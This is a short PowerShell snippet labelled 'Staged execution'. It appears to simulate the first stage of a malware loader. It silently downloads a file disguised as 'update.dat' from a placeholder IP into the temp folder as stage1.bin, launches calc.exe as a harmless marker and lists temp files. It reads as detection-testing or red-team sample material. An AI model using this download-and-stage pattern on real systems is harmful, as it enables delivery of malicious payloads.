
<# Staged execution #> $PayloadUrl = 'https://192.0.2.109:8443/assets/update.dat'; $OutputPath = "$env:TEMP\stage1.bin"; curl.exe -s -L -o $OutputPath $PayloadUrl; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $StageMarker = "stage-41"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
